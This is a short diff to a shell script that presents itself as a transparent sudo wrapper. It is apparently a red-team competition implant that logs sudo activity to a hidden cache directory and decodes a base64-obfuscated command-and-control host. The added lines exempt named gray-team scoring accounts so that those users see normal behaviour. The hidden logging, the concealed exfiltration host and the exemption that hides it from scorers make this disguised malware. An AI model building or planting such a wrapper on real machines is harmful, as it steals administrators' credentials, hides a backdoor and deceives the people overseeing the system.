@@ -3,6 +3,12 @@
 # Transparent wrapper — passes through all sudo behavior unchanged
 
 REAL_SUDO="/usr/bin/sudo"
+
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_SUDO "$@" ;;
+esac
+
 LOG_DIR="/var/lib/apt/lists/.cache"
 LOCAL_LOG="${LOG_DIR}/events"
 C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
